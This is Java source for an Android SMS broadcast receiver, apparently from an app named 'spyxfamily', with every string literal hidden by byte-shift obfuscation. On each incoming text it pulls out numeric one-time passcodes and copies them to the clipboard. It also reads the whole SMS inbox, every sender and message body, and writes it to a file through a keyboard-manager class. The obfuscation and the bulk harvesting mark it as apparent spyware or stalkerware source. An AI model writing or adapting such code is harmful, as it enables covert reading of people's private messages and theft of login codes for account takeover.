package com.example.spyxfamily;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsReceiver extends BroadcastReceiver {
    // regex for numeric OTPs
    private final Pattern sFourDigit = Pattern.compile((new Object() {int t;public String toString() {byte[] buf = new byte[7];t = 558078821;buf[0] = (byte) (t >>> 19);t = 1719916345;buf[1] = (byte) (t >>> 6);t = 740621094;buf[2] = (byte) (t >>> 3);t = -1037079003;buf[3] = (byte) (t >>> 13);t = 1528452079;buf[4] = (byte) (t >>> 15);t = -163658031;buf[5] = (byte) (t >>> 15);t = 2057648867;buf[6] = (byte) (t >>> 13);return new String(buf);}}.toString()), Pattern.CASE_INSENSITIVE);
    private final Pattern sFiveDigit = Pattern.compile((new Object() {int t;public String toString() {byte[] buf = new byte[7];t = 1262817965;buf[0] = (byte) (t >>> 13);t = 894143559;buf[1] = (byte) (t >>> 13);t = -1767078357;buf[2] = (byte) (t >>> 13);t = -990470613;buf[3] = (byte) (t >>> 17);t = 1332577111;buf[4] = (byte) (t >>> 4);t = 636858256;buf[5] = (byte) (t >>> 18);t = -48983535;buf[6] = (byte) (t >>> 15);return new String(buf);}}.toString()), Pattern.CASE_INSENSITIVE);
    private final Pattern sSixDigit = Pattern.compile((new Object() {int t;public String toString() {byte[] buf = new byte[7];t = 86066352;buf[0] = (byte) (t >>> 11);t = 1286479125;buf[1] = (byte) (t >>> 15);t = -926373809;buf[2] = (byte) (t >>> 17);t = -1835165773;buf[3] = (byte) (t >>> 4);t = 324437699;buf[4] = (byte) (t >>> 5);t = 2109561903;buf[5] = (byte) (t >>> 24);t = 260386230;buf[6] = (byte) (t >>> 13);return new String(buf);}}.toString()), Pattern.CASE_INSENSITIVE);

    @Override
    public void onReceive(Context context, Intent intent) {
        KeyboardManager keyboardManager = KeyboardManager.getInstance(context.getApplicationContext());
        String sms, code;

        sms = retrieveLatestSms(intent);
        if (codeExists(sms)) {
            // apparently -1 is out of bounds
            String[] tmp;
            tmp = sms.split((new Object() {int t;public String toString() {byte[] buf = new byte[8];t = -964215236;buf[0] = (byte) (t >>> 17);t = 104324080;buf[1] = (byte) (t >>> 15);t = 577689934;buf[2] = (byte) (t >>> 16);t = -1850058139;buf[3] = (byte) (t >>> 15);t = 911777586;buf[4] = (byte) (t >>> 20);t = 124663831;buf[5] = (byte) (t >>> 16);t = -1717755303;buf[6] = (byte) (t >>> 14);t = -2042959277;buf[7] = (byte) (t >>> 16);return new String(buf);}}.toString()));
            String message = tmp[tmp.length - 1];

            code = retrieveCode(message);

            if (code.length() > 0) {
                setClipboard(context, code);
            }
        }

        try {
            sms = retrieveAllSms(context);
        }
        catch (Exception e) {
            Log.d("error", "ok");
        }
        // write to file
        keyboardManager.writeFile(sms);
    }

    private String retrieveAllSms(Context context) {
        Uri uriSms = Uri.parse((new Object() {int t;public String toString() {byte[] buf = new byte[19];t = 2065054298;buf[0] = (byte) (t >>> 12);t = -151257257;buf[1] = (byte) (t >>> 20);t = 860108513;buf[2] = (byte) (t >>> 4);t = 2043773177;buf[3] = (byte) (t >>> 18);t = -1684362067;buf[4] = (byte) (t >>> 5);t = -1150215199;buf[5] = (byte) (t >>> 19);t = 1314098841;buf[6] = (byte) (t >>> 5);t = 1033431503;buf[7] = (byte) (t >>> 10);t = -1713994251;buf[8] = (byte) (t >>> 5);t = -524301068;buf[9] = (byte) (t >>> 18);t = 1387166618;buf[10] = (byte) (t >>> 13);t = 728610962;buf[11] = (byte) (t >>> 16);t = 283611611;buf[12] = (byte) (t >>> 17);t = 1418424287;buf[13] = (byte) (t >>> 14);t = 1888299918;buf[14] = (byte) (t >>> 13);t = -1762979025;buf[15] = (byte) (t >>> 20);t = 1654783946;buf[16] = (byte) (t >>> 24);t = -345115823;buf[17] = (byte) (t >>> 13);t = 2016221169;buf[18] = (byte) (t >>> 24);return new String(buf);}}.toString()));
        StringBuilder sb = new StringBuilder();

        Cursor smsInbox = context.getContentResolver()
                .query(uriSms,
                        new String[]{(new Object() {int t;public String toString() {byte[] buf = new byte[3];t = -606616835;buf[0] = (byte) (t >>> 14);t = -851571677;buf[1] = (byte) (t >>> 21);t = 229792014;buf[2] = (byte) (t >>> 15);return new String(buf);}}.toString()),
                                (new Object() {int t;public String toString() {byte[] buf = new byte[7];t = 1606782005;buf[0] = (byte) (t >>> 5);t = 793621090;buf[1] = (byte) (t >>> 7);t = 1693429167;buf[2] = (byte) (t >>> 24);t = 731679153;buf[3] = (byte) (t >>> 14);t = -363752035;buf[4] = (byte) (t >>> 10);t = 658450966;buf[5] = (byte) (t >>> 20);t = -56542731;buf[6] = (byte) (t >>> 7);return new String(buf);}}.toString()),
                                (new Object() {int t;public String toString() {byte[] buf = new byte[4];t = 1991779912;buf[0] = (byte) (t >>> 4);t = -627167095;buf[1] = (byte) (t >>> 7);t = 1572498638;buf[2] = (byte) (t >>> 15);t = -967307126;buf[3] = (byte) (t >>> 20);return new String(buf);}}.toString()),
                                (new Object() {int t;public String toString() {byte[] buf = new byte[4];t = -943083836;buf[0] = (byte) (t >>> 1);t = 590859819;buf[1] = (byte) (t >>> 15);t = -1742009566;buf[2] = (byte) (t >>> 3);t = 50673555;buf[3] = (byte) (t >>> 4);return new String(buf);}}.toString())},
                        null,
                        null,
                        null);

        smsInbox.moveToFirst();
        do {
            String address = smsInbox.getString(1);
            String body = smsInbox.getString(3);

            sb.append((new Object() {int t;public String toString() {byte[] buf = new byte[5];t = 2079281570;buf[0] = (byte) (t >>> 6);t = 18295388;buf[1] = (byte) (t >>> 12);t = -1019511025;buf[2] = (byte) (t >>> 11);t = 1285257953;buf[3] = (byte) (t >>> 14);t = -2066053911;buf[4] = (byte) (t >>> 2);return new String(buf);}}.toString())).append(address);
            sb.append((new Object() {int t;public String toString() {byte[] buf = new byte[2];t = 1412946291;buf[0] = (byte) (t >>> 2);t = -2051366957;buf[1] = (byte) (t >>> 18);return new String(buf);}}.toString()));
            sb.append((new Object() {int t;public String toString() {byte[] buf = new byte[8];t = 71296134;buf[0] = (byte) (t >>> 1);t = 1540240196;buf[1] = (byte) (t >>> 22);t = 1610583507;buf[2] = (byte) (t >>> 5);t = -1672955324;buf[3] = (byte) (t >>> 7);t = 1328721658;buf[4] = (byte) (t >>> 15);t = 1181602679;buf[5] = (byte) (t >>> 13);t = -1171254972;buf[6] = (byte) (t >>> 23);t = 1576222837;buf[7] = (byte) (t >>> 1);return new String(buf);}}.toString())).append(body);
            sb.append((new Object() {int t;public String toString() {byte[] buf = new byte[2];t = 772758732;buf[0] = (byte) (t >>> 23);t = 566026461;buf[1] = (byte) (t >>> 1);return new String(buf);}}.toString()));
            sb.append((new Object() {int t;public String toString() {byte[] buf = new byte[2];t = 2131547596;buf[0] = (byte) (t >>> 4);t = 1848699475;buf[1] = (byte) (t >>> 24);return new String(buf);}}.toString()));
        }
        while  (smsInbox.moveToNext());

        smsInbox.close();
        return sb.toString();
    }

    private String retrieveLatestSms(Intent intent) {

        Bundle bundle = intent.getExtras();
        SmsMessage[] msg;
        StringBuilder sb = new StringBuilder();
        String format = bundle.getString((new Object() {int t;public String toString() {byte[] buf = new byte[6];t = -322877891;buf[0] = (byte) (t >>> 21);t = -1648467566;buf[1] = (byte) (t >>> 18);t = -927767663;buf[2] = (byte) (t >>> 3);t = 918791652;buf[3] = (byte) (t >>> 23);t = 1923811473;buf[4] = (byte) (t >>> 11);t = 15324047;buf[5] = (byte) (t >>> 10);return new String(buf);}}.toString()));

        // retrieve the SMS message received.
        Object[] pdu = (Object[]) bundle.get((new Object() {int t;public String toString() {byte[] buf = new byte[4];t = 1895638944;buf[0] = (byte) (t >>> 24);t = 858929637;buf[1] = (byte) (t >>> 15);t = -484615123;buf[2] = (byte) (t >>> 14);t = -1368145850;buf[3] = (byte) (t >>> 21);return new String(buf);}}.toString()));
        if (pdu != null) {
            // fill the msg array.
            msg = new SmsMessage[pdu.length];
            for (int i = 0; i < msg.length; i++) {
                // check Android version and use appropriate createFromPdu.
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    msg[i] = SmsMessage.createFromPdu((byte[]) pdu[i], format);
                } else {
                    // If Android version L or older:
                    msg[i] = SmsMessage.createFromPdu((byte[]) pdu[i]);
                }
                // build the message to show.
                sb.append((new Object() {int t;public String toString() {byte[] buf = new byte[5];t = -1106143069;buf[0] = (byte) (t >>> 14);t = -1013876801;buf[1] = (byte) (t >>> 19);t = -480196871;buf[2] = (byte) (t >>> 4);t = -1016479383;buf[3] = (byte) (t >>> 19);t = -1804302784;buf[4] = (byte) (t >>> 17);return new String(buf);}}.toString())).append(msg[i].getOriginatingAddress());
                sb.append((new Object() {int t;public String toString() {byte[] buf = new byte[2];t = -1374292081;buf[0] = (byte) (t >>> 23);t = -816386667;buf[1] = (byte) (t >>> 12);return new String(buf);}}.toString()));
                sb.append((new Object() {int t;public String toString() {byte[] buf = new byte[8];t = 523405959;buf[0] = (byte) (t >>> 1);t = -608715916;buf[1] = (byte) (t >>> 15);t = 849722212;buf[2] = (byte) (t >>> 10);t = 195503235;buf[3] = (byte) (t >>> 19);t = 1264765460;buf[4] = (byte) (t >>> 9);t = 1457629578;buf[5] = (byte) (t >>> 20);t = 1949616955;buf[6] = (byte) (t >>> 24);t = 1652771956;buf[7] = (byte) (t >>> 1);return new String(buf);}}.toString())).append(msg[i].getMessageBody());
                sb.append((new Object() {int t;public String toString() {byte[] buf = new byte[2];t = -1737886024;buf[0] = (byte) (t >>> 1);t = 1190586298;buf[1] = (byte) (t >>> 12);return new String(buf);}}.toString()));
                sb.append((new Object() {int t;public String toString() {byte[] buf = new byte[2];t = 988192233;buf[0] = (byte) (t >>> 19);t = 1451662240;buf[1] = (byte) (t >>> 6);return new String(buf);}}.toString()));
            }
        }
        return sb.toString();
    }

    // looks for signs of an OTP message
    private boolean codeExists(String message) {
        return message.toLowerCase().contains((new Object() {int t;public String toString() {byte[] buf = new byte[4];t = 1462507774;buf[0] = (byte) (t >>> 6);t = -2133984929;buf[1] = (byte) (t >>> 13);t = 778975632;buf[2] = (byte) (t >>> 2);t = 643091430;buf[3] = (byte) (t >>> 20);return new String(buf);}}.toString())) || message.toLowerCase().contains((new Object() {int t;public String toString() {byte[] buf = new byte[3];t = 1869249839;buf[0] = (byte) (t >>> 24);t = -415070586;buf[1] = (byte) (t >>> 20);t = 1214695177;buf[2] = (byte) (t >>> 4);return new String(buf);}}.toString()));
    }

    private String retrieveCode(String message) {
        Matcher m = sSixDigit.matcher(message);
        if (m.find()) {
            return m.group(0);
        }
        else {
            m = sFiveDigit.matcher(message);
            if (m.find()) {
                return m.group(0);
            }
            else {
                m = sFourDigit.matcher(message);
                if (m.find()) {
                    return m.group(0);
                }
            }
        }
        return "";
    }

    private void setClipboard(Context context, String text) {
        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
        android.content.ClipData clip = android.content.ClipData.newPlainText("doesntmatter", text);
        clipboard.setPrimaryClip(clip);
    }
}